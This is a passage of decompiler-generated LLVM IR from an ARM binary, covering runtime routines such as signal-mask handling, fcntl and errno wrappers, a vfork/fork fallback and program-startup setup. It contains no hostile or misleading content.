  %v3_1073c = call i32 @function_10e68(%timespec* %v2_1073c, i32 %v2_1072c)
  store i32 %v3_1073c, i32* %r0.global-to-local, align 4
  store i32 %v3_1073c, i32* %r6.global-to-local, align 4
  %v0_10744 = call i32 @function_cc08()
  store i32 %v2_1067c, i32* %r1.global-to-local, align 4
  store i32 %v0_10744, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10758 = inttoptr i32 %v0_10744 to i32*
  %v2_10758 = load i32, i32* %v1_10758, align 4
  store i32 %v2_10758, i32* @r4, align 4
  %v3_1075c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_1075c = call i32 @function_10f84(i32 2, %_TYPEDEF_sigset_t* %v3_1075c, i32 0)
  store i32 %v4_1075c, i32* %r0.global-to-local, align 4
  %v0_10760 = load i32, i32* @r4, align 4
  %v1_10760 = load i32, i32* %r5.global-to-local, align 4
  %v2_10760 = inttoptr i32 %v1_10760 to i32*
  store i32 %v0_10760, i32* %v2_10760, align 4
  %v0_10790.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10790

dec_label_pc_10768:                               ; preds = %dec_label_pc_10720
  store i32 %v2_1067c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_10774 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10774 = call i32 @function_10f84(i32 2, %_TYPEDEF_sigset_t* %v3_10774, i32 0)
  store i32 %v4_10774, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10784

dec_label_pc_10784:                               ; preds = %dec_label_pc_10698.dec_label_pc_10784_crit_edge, %dec_label_pc_10768
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_10698.dec_label_pc_10784_crit_edge ], [ %v2_1072c, %dec_label_pc_10768 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_10788 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_10788 = call i32 @function_10e68(%timespec* %v2_10788, i32 %storemerge.pre-phi)
  store i32 %v3_10788, i32* %r0.global-to-local, align 4
  store i32 %v3_10788, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_10734, %dec_label_pc_10784
  %v0_10790 = phi i32 [ %v0_10790.pr, %dec_label_pc_10734 ], [ %v3_10788, %dec_label_pc_10784 ]
  %v2_10790 = icmp eq i32 %v0_10790, 0
  br i1 %v2_10790, label %dec_label_pc_107b4, label %dec_label_pc_10798

dec_label_pc_10798:                               ; preds = %dec_label_pc_10790
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_107a0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_107a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107b4:                               ; preds = %dec_label_pc_10628, %dec_label_pc_10790
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107bc:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_106cc, %dec_label_pc_10658
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107c0

dec_label_pc_107c0:                               ; preds = %dec_label_pc_10798, %dec_label_pc_107b4, %dec_label_pc_106f8, %dec_label_pc_107bc
  %v17_107c4 = phi i32 [ %v3_107a0, %dec_label_pc_10798 ], [ 0, %dec_label_pc_107b4 ], [ %v17_107c4.pre, %dec_label_pc_106f8 ], [ -1, %dec_label_pc_107bc ]
  %v2_107c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_107c4, i32* @r4, align 4
  store i32 %v6_10628, i32* @r5, align 4
  store i32 %v9_10628, i32* @r6, align 4
  ret i32 %v17_107c4

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_1072c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_106bc, { 0, 2, 1 }
  uselistorder i32 %v2_1067c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_10674, { 1, 0, 2 }
  uselistorder i32 %v2_10658, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10648, { 0, 2, 1 }
  uselistorder i32 %v16_10628, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 23, 10, 12, 13, 11, 15, 14, 17, 16, 22, 18, 24, 19, 21, 20, 0 }
  uselistorder i32 (i32, i32)* @function_13360, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107c0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_107bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_107b4, { 1, 0 }
  uselistorder label %dec_label_pc_10790, { 1, 0 }
  uselistorder label %dec_label_pc_10784, { 1, 0 }
  uselistorder label %dec_label_pc_106b4, { 1, 0 }
  uselistorder label %dec_label_pc_10640, { 1, 0 }
}

define i32 @function_107cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_107f8:
  %stack_var_-8 = alloca i32, align 4
  %v3_107cc = load i32, i32* @r4, align 4
  store i32 %v3_107cc, i32* %stack_var_-8, align 4
  %v2_107fc = load i32, i32* @global_var_1aabc.488, align 4
  %v2_10800 = icmp eq i32 %v2_107fc, 0
  br i1 %v2_10800, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_107f8
  call void @__pseudo_branch(i32 %v2_107fc)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_107f8, %bb
  %v2_10810 = load i32, i32* @global_var_1aac0.490, align 4
  %v2_10814 = icmp eq i32 %v2_10810, 0
  br i1 %v2_10814, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_10818 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_10818, i32* @r4, align 4
  %v9_10818 = load i32, i32* @r0, align 4
  ret i32 %v9_10818

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_10810)
  %v2_10824 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10824, i32* @r4, align 4
  %v8_10824 = load i32, i32* @r0, align 4
  ret i32 %v8_10824

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10838() local_unnamed_addr {
dec_label_pc_10838:
  ret i32 0
}

define i32 @function_10840() local_unnamed_addr {
dec_label_pc_10840:
  %v1_10840 = load i32, i32* @r0, align 4
  ret i32 %v1_10840
}

define i32 @function_10844(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10844:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10844 = load i32, i32* @r4, align 4
  store i32 %v3_10844, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_10854 = call i32 @function_10c48(i32 %arg1, i32 1)
  %v7_10858 = icmp eq i32 %v2_10854, -1
  br i1 %v7_10858, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_10844
  %v3_1085c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1085c, i32* @r4, align 4
  ret i32 %v2_10854

bb4:                                              ; preds = %dec_label_pc_10844
  %v0_10860 = load i32, i32* @r4, align 4
  %v4_10868 = call i32 @function_10e94(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_175a8.493, i32 0, i32 0), i32 %v0_10860)
  %v1_1086c = load i32, i32* %r5.global-to-local, align 4
  %v9_1086c = icmp eq i32 %v4_10868, %v1_1086c
  br i1 %v9_1086c, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_10870 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_10870, i32* @r4, align 4
  ret i32 %v4_10868

bb6:                                              ; preds = %bb4
  %v0_10874 = call i32 @function_fd08()
  %v0_10878 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10878, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_10874

; uselistorder directives
  uselistorder i32 %v2_10854, { 1, 0 }
  uselistorder i32 ()* @function_fd08, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1087c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1087c:
  %v2_10880 = load i32, i32* @global_var_1aac4.495, align 4
  %v2_10884 = icmp eq i32 %v2_10880, 0
  br i1 %v2_10884, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1087c
  %v6_10890 = load i32, i32* @r0, align 4
  ret i32 %v6_10890

bb3:                                              ; preds = %dec_label_pc_1087c
  store i32 1, i32* @global_var_1aac4.495, align 4
  store i32 4096, i32* @global_var_1aab8.430, align 4
  %v0_108c4 = call i32 @function_d4d4()
  ret i32 %v0_108c4
}

define i32 @function_108d8(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_108d8:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_108dc = mul i32 %arg2, 4
  %v5_108dc = add i32 %tmp, %v4_108dc
  %v2_108e0 = load i32, i32* %arg3, align 4
  %v2_108e4 = ptrtoint i32* %stack_var_-120 to i32
  %v1_108e8 = add i32 %v5_108dc, 4
  %v9_108ec = icmp eq i32 %v1_108e8, %v2_108e0
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_1aab0.501, align 4
  store i32 %v1_108e8, i32* @global_var_1aab4.482, align 4
  store i32 %arg6, i32* @global_var_1aac0.490, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_108ec, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_108d8
  store i32 %v5_108dc, i32* @global_var_1aab4.482, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_108d8, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_1092c = bitcast i32* %stack_var_-120 to i8*
  %v3_1092c = call i32 @function_ec20(i8* %v2_1092c, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1aab4.482, align 4
  br label %dec_label_pc_1093c

dec_label_pc_1093c:                               ; preds = %dec_label_pc_1093c, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_1093c, %dec_label_pc_1093c ]
  %v1_1093c = inttoptr i32 %storemerge to i32*
  %v2_1093c = load i32, i32* %v1_1093c, align 4
  %v4_1093c = add i32 %storemerge, 4
  %v2_10940 = icmp eq i32 %v2_1093c, 0
  br i1 %v2_10940, label %dec_label_pc_1094c, label %dec_label_pc_1093c

dec_label_pc_1094c:                               ; preds = %dec_label_pc_1093c
  store i32 %v4_1093c, i32* @r4, align 4
  %v1_1096c22 = inttoptr i32 %v4_1093c to i32*
  %v2_1096c23 = load i32, i32* %v1_1096c22, align 4
  %v2_1097025 = icmp eq i32 %v2_1096c23, 0
  br i1 %v2_1097025, label %dec_label_pc_10978, label %dec_label_pc_10954

dec_label_pc_10954:                               ; preds = %dec_label_pc_1094c, %dec_label_pc_1096c
  %v5_10958 = phi i32 [ %v2_1096c, %dec_label_pc_1096c ], [ %v2_1096c23, %dec_label_pc_1094c ]
  %v2_10954 = icmp ugt i32 %v5_10958, 13
  %v7_10954 = icmp eq i32 %v5_10958, 14
  %v2_10958 = xor i1 %v2_10954, true
  %v3_10958 = or i1 %v7_10954, %v2_10958
  br i1 %v3_10958, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10954
  %v6_10958 = and i32 %v5_10958, 536870912
  %v7_10958 = icmp ne i32 %v6_10958, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_10954, %bb42
  %v1_10964 = phi i1 [ %v2_10954, %dec_label_pc_10954 ], [ %v7_10958, %bb42 ]
  %v2_1095c = xor i1 %v1_10964, true
  %v3_1095c = or i1 %v7_10954, %v2_1095c
  br i1 %v3_1095c, label %bb44, label %dec_label_pc_1096c

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_1096c

dec_label_pc_1096c:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_1095c, i32 ptrtoint (i32* @global_var_ec10.403 to i32))
  %v0_10968 = load i32, i32* @r4, align 4
  %v1_10968 = add i32 %v0_10968, 8
  store i32 %v1_10968, i32* @r4, align 4
  %v1_1096c = inttoptr i32 %v1_10968 to i32*
  %v2_1096c = load i32, i32* %v1_1096c, align 4
  %v2_10970 = icmp eq i32 %v2_1096c, 0
  br i1 %v2_10970, label %dec_label_pc_10978, label %dec_label_pc_10954

dec_label_pc_10978:                               ; preds = %dec_label_pc_1096c, %dec_label_pc_1094c
  %v1_1097c = call i32 @function_133a8(i32 %v2_108e4)
  store i32 %v1_1097c, i32* @r0, align 4
  %v1_10980 = call i32 @function_1087c(i32 %v1_1097c)
  store i32 %v1_10980, i32* @r0, align 4
  %v2_1098c = icmp eq i32 %tmp37, 0
  br i1 %v2_1098c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_10978
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10978, %bb45
  %v0_1099c = phi i32 [ %tmp37, %dec_label_pc_10978 ], [ 4096, %bb45 ]
  %v3_10994 = icmp eq i32 %tmp36, -1
  %v8_10994 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1aab8.430 to i32), i32* @r2, align 4
  store i32 %v0_1099c, i32* @global_var_1aab8.430, align 4
  br i1 %v3_10994, label %dec_label_pc_109a4, label %dec_label_pc_109cc

dec_label_pc_109a4:                               ; preds = %bb46
  %v0_109a4 = call i32 @function_10e3c()
  store i32 %v0_109a4, i32* @r0, align 4
  store i32 %v0_109a4, i32* @r4, align 4
  %v0_109ac = call i32 @function_10de4()
  %v0_109b0 = load i32, i32* @r4, align 4
  %v9_109b0 = icmp eq i32 %v0_109b0, %v0_109ac
  br i1 %v9_109b0, label %dec_label_pc_109b8, label %dec_label_pc_109f4

dec_label_pc_109b8:                               ; preds = %dec_label_pc_109a4
  %v1_109b8 = call i32 @function_10e10(i32 %v0_109ac)
  store i32 %v1_109b8, i32* @r0, align 4
  store i32 %v1_109b8, i32* @r4, align 4
  %v0_109c0 = call i32 @function_10db8()
  %v0_109c4 = load i32, i32* @r4, align 4
  %v9_109c4 = icmp eq i32 %v0_109c4, %v0_109c0
  br i1 %v9_109c4, label %dec_label_pc_109cc, label %dec_label_pc_109f4

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109b8, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_10994, label %dec_label_pc_10a60, label %dec_label_pc_109d8

dec_label_pc_109d8:                               ; preds = %dec_label_pc_109cc
  %v9_109dc = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_109dc, label %dec_label_pc_109e4, label %dec_label_pc_109f4

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109d8
  br label %dec_label_pc_109f4

dec_label_pc_109f4:                               ; preds = %dec_label_pc_109e4, %dec_label_pc_109d8, %dec_label_pc_109b8, %dec_label_pc_109a4
  %v2_109fc = call i32 @function_10844(i32 0, i32 32768)
  %v2_10a08 = call i32 @function_10844(i32 1, i32 32770)
  %v2_10a14 = call i32 @function_10844(i32 2, i32 32770)
  br label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_109f4, %dec_label_pc_109cc
  %v0_10a24 = load i32, i32* @r6, align 4
  %v1_10a24 = inttoptr i32 %v0_10a24 to i32*
  %v2_10a24 = load i32, i32* %v1_10a24, align 4
  store i32 %v2_10a24, i32* @global_var_18420, align 4
  store i32 %arg5, i32* @global_var_1aabc.488, align 4
  %v2_10a60 = icmp eq i32 %arg4, 0
  br i1 %v2_10a60, label %dec_label_pc_10a9c, label %bb47

bb47:                                             ; preds = %dec_label_pc_10a60
  br label %dec_label_pc_10a9c

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a60, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_10aac = call i32 @function_cc08()
  %v2_10ab4 = inttoptr i32 %v1_10aac to i32*
  store i32 0, i32* %v2_10ab4, align 4
  %v1_10ac8 = call i32 @function_11004()
  %v2_10ad0 = inttoptr i32 %v1_10ac8 to i32*
  store i32 0, i32* %v2_10ad0, align 4
  %v0_10ae0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_10aec = call i32 @function_10500(i32 %v0_10ae0)
  ret i32 %v1_10aec

; uselistorder directives
  uselistorder i32 %v2_1096c, { 1, 0 }
  uselistorder i32 %v1_10968, { 1, 0 }
  uselistorder i1 %v2_10954, { 1, 0 }
  uselistorder i32 %v4_1093c, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_10500, { 0, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 5, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_10844, { 2, 1, 0 }
  uselistorder i32* @global_var_1aab8.430, { 1, 4, 0, 2, 3 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10a9c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_1096c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_10954, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_10b24(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10b24:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_10b24 = load i32, i32* @r4, align 4
  %v6_10b24 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_10b28 = icmp eq i32* %arg2, null
  %v2_10b2c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_10b28, label %dec_label_pc_10b98, label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b24
  %v2_10b40 = load i32, i32* %arg2, align 4
  %v4_10b40 = add i32 %tmp, 4
  store i32 %v4_10b40, i32* @r1, align 4
  %v2_10b44 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_10b44, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_10b40, i32* %stack_var_-156, align 4
  %v0_10b50 = call i32 @function_ec10()
  store i32 %v0_10b50, i32* %r0.global-to-local, align 4
  %v0_10b54 = load i32, i32* @r4, align 4
  %v1_10b54 = add i32 %v0_10b54, 132
  %v2_10b54 = inttoptr i32 %v1_10b54 to i32*
  %v3_10b54 = load i32, i32* %v2_10b54, align 4
  %v1_10b58 = and i32 %v3_10b54, 67108864
  %v2_10b58 = icmp eq i32 %v1_10b58, 0
  br i1 %v2_10b58, label %dec_label_pc_10b6c, label %bb

bb:                                               ; preds = %dec_label_pc_10b3c
  br label %dec_label_pc_10b88

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b3c
  %v1_10b74 = and i32 %v3_10b54, 4
  %v2_10b74 = icmp eq i32 %v1_10b74, 0
  br i1 %v2_10b74, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_10b6c
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_10b6c, %bb20
  br label %dec_label_pc_10b88

dec_label_pc_10b88:                               ; preds = %bb, %bb21
  %v2_10b88 = icmp eq i32 %v0_10b54, 0
  %v3_10b8c = ptrtoint i32* %stack_var_-156 to i32
  %.v3_10b8c = select i1 %v2_10b88, i32 0, i32 %v3_10b8c
  %v0_10b98.pre = load i32, i32* @r5, align 4
  %v0_10ba8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10b98

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10b88, %dec_label_pc_10b24
  %v0_10ba8 = phi i32 [ %arg1, %dec_label_pc_10b24 ], [ %v0_10ba8.pre, %dec_label_pc_10b88 ]
  %v0_10b98 = phi i32 [ %arg3, %dec_label_pc_10b24 ], [ %v0_10b98.pre, %dec_label_pc_10b88 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10b24 ], [ %.v3_10b8c, %dec_label_pc_10b88 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_10b98 = icmp eq i32 %v0_10b98, 0
  %.v2_10b2c = select i1 %v2_10b98, i32 0, i32 %v2_10b2c
  store i32 %.v2_10b2c, i32* @r2, align 4
  store i32 %v0_10ba8, i32* %r0.global-to-local, align 4
  %v1_10bac = call i32 @function_10d0c(i32 %v0_10ba8)
  store i32 %v1_10bac, i32* %r0.global-to-local, align 4
  %v0_10bb0 = load i32, i32* @r5, align 4
  %v2_10bb0 = icmp eq i32 %v0_10bb0, 0
  br i1 %v2_10bb0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_10b98
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_10b98, %bb25
  %v0_10bc0.pr = phi i32 [ 0, %dec_label_pc_10b98 ], [ 1, %bb25 ]
  %v1_10bb8 = icmp slt i32 %v1_10bac, 0
  br i1 %v1_10bb8, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_10bf4

thread-pre-split:                                 ; preds = %bb26
  %v2_10bc0 = icmp eq i32 %v0_10bc0.pr, 0
  store i32 %v1_10bac, i32* @r4, align 4
  br i1 %v2_10bc0, label %dec_label_pc_10bf4, label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %thread-pre-split
  %v2_10bcc = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_10bb0, i32* %r0.global-to-local, align 4
  %v2_10bd4 = inttoptr i32 %v0_10bb0 to i32*
  store i32 %v2_10bcc, i32* %v2_10bd4, align 4
  %v3_10bd4 = load i32, i32* %r0.global-to-local, align 4
  %v4_10bd4 = add i32 %v3_10bd4, 4
  store i32 %v4_10bd4, i32* @r0, align 4
  %v2_10bd8 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_10bd8, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_10be0 = call i32 @function_ec10()
  store i32 %v0_10be0, i32* %r0.global-to-local, align 4
  %v1_10be8 = load i32, i32* @r5, align 4
  %v2_10be8 = add i32 %v1_10be8, 136
  %v3_10be8 = inttoptr i32 %v2_10be8 to i32*
  %v1_10bf0 = load i32, i32* @r5, align 4
  %v2_10bf0 = add i32 %v1_10bf0, 132
  %v3_10bf0 = inttoptr i32 %v2_10bf0 to i32*
  %v0_10bf4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_10bcc
  %v0_10bf4 = phi i32 [ %v1_10bac, %thread-pre-split ], [ %v0_10bf4.pre, %dec_label_pc_10bcc ], [ %v1_10bac, %thread-pre-split.thread ]
  store i32 %v0_10bf4, i32* %r0.global-to-local, align 4
  store i32 %v3_10b24, i32* @r4, align 4
  store i32 %v6_10b24, i32* @r5, align 4
  ret i32 %v0_10bf4

; uselistorder directives
  uselistorder i32 %v0_10bf4, { 1, 0 }
  uselistorder i32 %v0_10bb0, { 1, 0, 2 }
  uselistorder i32 %v0_10ba8, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 5, 2, 7, 1, 0 }
  uselistorder label %dec_label_pc_10bf4, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_10b88, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_10c10(i32 %arg1) local_unnamed_addr {
dec_label_pc_10c10:
  %v0_10c10 = call i32 @vfork()
  store i32 %v0_10c10, i32* @r0, align 4
  %v2_10c14 = icmp ugt i32 %v0_10c10, -4097
  br i1 %v2_10c14, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_10c28, %dec_label_pc_10c10
  %merge = phi i32 [ %v0_10c10, %dec_label_pc_10c10 ], [ %v0_10c28, %dec_label_pc_10c28 ]
  ret i32 %merge

bb1:                                              ; preds = %dec_label_pc_10c10
  %v4_10c20 = icmp eq i32 %v0_10c10, -38
  br i1 %v4_10c20, label %dec_label_pc_10c28, label %bb2

dec_label_pc_10c28:                               ; preds = %bb1
  %v0_10c28 = call i32 @fork()
  store i32 %v0_10c28, i32* @r0, align 4
  %v2_10c2c = icmp ugt i32 %v0_10c28, -4097
  br i1 %v2_10c2c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_10c28
  %v0_10c34 = call i32 @function_13408()
  %v1_10c3c = inttoptr i32 %v0_10c34 to %sigcontext*
  %v3_10c40 = call i32 @sigreturn(%sigcontext* %v1_10c3c)
  %v4_10c40 = inttoptr i32 %v3_10c40 to %sigcontext*
  %v3_10c44 = call i32 @sigreturn(%sigcontext* %v4_10c40)
  ret i32 %v3_10c44

; uselistorder directives
  uselistorder i32 %v0_10c28, { 1, 2, 0 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10c48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c48:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_10c48 = load i32, i32* @r2, align 4
  %v1_10c58 = add i32 %arg2, -12
  store i32 %v6_10c48, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_10c58, 2
  br i1 %tmp, label %dec_label_pc_10c80, label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c48
  %v0_10c78 = call i32 @function_10cbc()
  br label %dec_label_pc_10cac

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c48
  %v2_10c88 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_10c88, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_10c88, -4095
  br i1 %tmp8, label %dec_label_pc_10cac, label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c80
  %v0_10c98 = call i32 @function_cc08()
  %v0_10c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_10c9c = sub i32 0, %v0_10c9c
  %v2_10ca0 = inttoptr i32 %v0_10c98 to i32*
  store i32 %v1_10c9c, i32* %v2_10ca0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10c80, %dec_label_pc_10c78
  %storemerge = phi i32 [ %v0_10c78, %dec_label_pc_10c78 ], [ %v2_10c88, %dec_label_pc_10c80 ], [ -1, %dec_label_pc_10c98 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10c88, { 1, 0, 2 }
}

define i32 @function_10cbc() local_unnamed_addr {
dec_label_pc_10cbc:
  %r4.global-to-local = alloca i32, align 4
  %v0_10cdc = load i32, i32* @r0, align 4
  store i32 %v0_10cdc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cdc, -4095
  br i1 %tmp, label %dec_label_pc_10cf8, label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cbc
  %v0_10ce8 = call i32 @function_cc08()
  %v0_10cec = load i32, i32* %r4.global-to-local, align 4
  %v1_10cec = sub i32 0, %v0_10cec
  %v2_10cf0 = inttoptr i32 %v0_10ce8 to i32*
  store i32 %v1_10cec, i32* %v2_10cf0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10cf8

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10cbc, %dec_label_pc_10ce8
  %v0_10cf8 = phi i32 [ %v0_10cdc, %dec_label_pc_10cbc ], [ -1, %dec_label_pc_10ce8 ]
  ret i32 %v0_10cf8

; uselistorder directives
  uselistorder i32 %v0_10cdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10cf8, { 1, 0 }
}

define i32 @function_10d0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d0c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d0c = load i32, i32* @r4, align 4
  store i32 %v3_10d0c, i32* %stack_var_-8, align 4
  %v1_10d10 = load i32, i32* @r1, align 4
  %v2_10d10 = inttoptr i32 %v1_10d10 to %sigaction*
